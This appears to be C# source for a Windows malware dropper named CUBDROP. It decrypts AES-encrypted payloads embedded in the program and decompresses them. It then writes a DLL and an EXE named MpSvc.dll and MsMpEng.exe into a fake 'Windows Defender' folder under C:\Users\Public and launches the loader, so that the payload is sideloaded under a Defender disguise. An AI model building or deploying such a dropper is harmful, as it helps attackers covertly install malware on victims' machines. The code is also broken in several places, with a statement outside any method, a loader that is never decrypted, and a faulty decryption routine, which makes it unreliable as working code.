using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.IO.Compression;

namespace cubdrop
{
    public static class StreamExtensions
    {
        public static byte[] ToByteArray(this Stream stream)
        {
            stream.Position = 0;
            byte[] buffer = new byte[stream.Length];
            for (int totalBytesCopied = 0; totalBytesCopied < stream.Length;)
                totalBytesCopied += stream.Read(buffer, totalBytesCopied, Convert.ToInt32(stream.Length) - totalBytesCopied);
            return buffer;
        }
    }

    internal class MainProject
    {
        private static void Main()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("CUBDROP Dropper and DLL-sideloading Utility\n");
            Console.ResetColor();

            string diskLocationDirectory = "C:\\Users\\Public\\Windows Defender\\";
            string payloadDllPath = diskLocationDirectory + "MpSvc.dll";
            string loaderExePath = diskLocationDirectory + "MsMpEng.exe";

            bool check_exists = System.IO.Directory.Exists(diskLocationDirectory);

            if (!check_exists)
            {
                System.IO.Directory.CreateDirectory(diskLocationDirectory);
            }

            Stream payloadStream = null, loaderStream = null;

            try
            {
                // Extract the embedded resources
                payloadStream = ExtractResource("payload_dll.enc");
                loaderStream = ExtractResource("loader_exe.enc");
            }
            catch
            {
                Console.WriteLine("[!] Failed to extract embedded resources");
            }

            Tuple<byte[], byte[]> payloadData = null, loaderData = null;

            try
            {
                // extract the appended key from each resource
                payloadData = ExtractKeyFromFile(payloadStream);
                loaderData = ExtractKeyFromFile(loaderStream);

                Console.WriteLine(string.Format("\t[+] Payload Key: {0}", Encoding.Default.GetString(payloadData.Item1)));
                Console.WriteLine(string.Format("\t[+] Loader Key: {0}", Encoding.Default.GetString(loaderData.Item1)));
            }
            catch
            {
                Console.WriteLine("[!] Failed to extract AES key from resource");
            }

            byte[] decryptedPayload = null, decryptedLoader = null;
            File.WriteAllBytes("extract.bin", payloadData.Item2);

            try
            {
                var iv = new byte[16] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

                decryptedPayload = decrypt(payloadData.Item2, payloadData.Item1, iv);

                File.WriteAllBytes("extract1.bin", decryptedPayload);
                Console.WriteLine("[+] Decrypted embedded resource via AES");
            }
            catch
            {
                Console.WriteLine("[!] Failed to decrypt");
            }

            byte[] decompressedPayload = null, decompressedLoader = null;
            try
            {
                decompressedPayload = Decompress(decryptedPayload);

                Console.WriteLine("[+] Decompressed");
            }
            catch
            {
                Console.WriteLine("[+] Failed to decompress");
            }

            File.WriteAllBytes(payloadDllPath, decompressedPayload);
            File.WriteAllBytes(loaderExePath, decompressedLoader);
        }

        System.Diagnostics.Process.Start(loaderExePath);
        
        private static Tuple<byte[], byte[]> ExtractKeyFromFile(Stream fileToExtract)
        {
            byte[] dataBytesFromStream = StreamExtensions.ToByteArray(fileToExtract);
            byte[] last32 = new byte[32];

            Array.Copy(dataBytesFromStream, dataBytesFromStream.Length - 32, last32, 0, 32);

            byte[] strippedFile = new byte[fileToExtract.Length - 32];
            Array.Copy(dataBytesFromStream, strippedFile, fileToExtract.Length - 32);

            return new Tuple<byte[], byte[]>(last32, strippedFile);
        }

        private static Stream ExtractResource(String embeddedResourceName)
        {
            Stream resourceToSave;
            Assembly currentAssembly = Assembly.GetExecutingAssembly();
            string[] assemblyResources = currentAssembly.GetManifestResourceNames();

            foreach (string resourcesByName in assemblyResources)
            {
                if (resourcesByName.ToLower().EndsWith(embeddedResourceName.ToLower()))
                {
                    Console.WriteLine("[+] Located resource: " + resourcesByName);
                    resourceToSave = currentAssembly.GetManifestResourceStream(resourcesByName);
                    return resourceToSave;
                }
            }

            return null;
        }

        private static byte[] decrypt(byte[] cipherText, byte[] Key, byte[] IV)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.KeySize = 128;
                aesAlg.BlockSize = 128;
                aesAlg.Padding = PaddingMode.Zeros;
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Write))
                    {
                        csDecrypt.Write(cipherText, 0, cipherText.Length);
                        csDecrypt.FlushFinalBlock();

                        return msDecrypt.ToArray();
                    }
                }
            }
        }

        private static byte[] Decompress(byte[] string_compressed)
        {
            byte[] compressed_bytes = string_compressed;
            var from = new MemoryStream(compressed_bytes);
            var to = new MemoryStream();
            var gZipStream = new GZipStream(from, CompressionMode.Decompress);
            gZipStream.CopyTo(to);
            return to.ToArray();
        }
    }
}
